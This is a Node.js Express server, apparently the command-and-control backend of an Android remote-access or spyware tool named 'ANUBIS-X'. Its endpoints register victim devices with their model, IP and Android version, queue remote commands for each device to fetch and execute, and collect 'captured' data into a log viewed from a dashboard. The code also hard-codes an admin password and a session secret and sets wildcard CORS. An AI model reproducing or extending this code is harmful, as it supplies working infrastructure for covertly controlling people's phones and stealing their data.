const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CORS =====
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ===== الإعدادات =====
app.use(bodyParser.json());
app.use(express.static(__dirname));
app.use(session({
    secret: 'anubis-secret-key-2024',
    resave: false,
    saveUninitialized: true
}));

// ===== التخزين المؤقت =====
let devices = [];
let commands = [];
let capturedData = [];

// ===== API: تسجيل جهاز جديد =====
app.post('/api/register-device', (req, res) => {
    const device = {
        id: req.body.device_id || 'unknown',
        model: req.body.model || 'Unknown',
        ip_address: req.body.ip_address || 'N/A',
        android_version: req.body.android_version || 'N/A',
        last_seen: new Date().toISOString(),
        online: true
    };
    
    const index = devices.findIndex(d => d.id === device.id);
    if (index !== -1) {
        devices[index] = { ...devices[index], ...device };
    } else {
        devices.push(device);
        console.log('📱 New device registered:', device.model);
    }
    
    res.json({ success: true });
});

// ===== API: جلب الأجهزة =====
app.get('/api/devices', (req, res) => {
    res.json({ devices });
});

// ===== API: إرسال أمر =====
app.post('/api/commands', (req, res) => {
    const command = {
        id: Date.now(),
        device_id: req.body.device_id,
        command: req.body.command,
        status: 'pending',
        created_at: new Date().toISOString()
    };
    
    commands.push(command);
    console.log('🎮 Command sent:', command.command, 'to', command.device_id);
    res.json({ success: true });
});

// ===== API: جلب الأوامر لجهاز =====
app.get('/api/get-commands/:deviceId', (req, res) => {
    const deviceCommands = commands.filter(c => 
        c.device_id === req.params.deviceId && c.status === 'pending'
    );
    
    deviceCommands.forEach(c => c.status = 'executed');
    
    res.json({ commands: deviceCommands });
});

// ===== API: إرسال بيانات =====
app.post('/api/send-data', (req, res) => {
    const data = req.body.data;
    capturedData.push(data);
    console.log('📊 Data received:', data);
    res.json({ success: true });
});

// ===== API: جلب البيانات =====
app.get('/api/data', (req, res) => {
    res.json({ logs: capturedData });
});

// ===== تسجيل الدخول =====
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'anubis2024') {
        req.session.logged_in = true;
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// ===== التحقق من الدخول =====
app.get('/api/check-auth', (req, res) => {
    res.json({ logged_in: req.session.logged_in || false });
});

// ===== تسجيل الخروج =====
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ===== الصفحات =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.listen(PORT, () => {
    console.log(`⚡ ANUBIS-X running on port ${PORT}`);
});
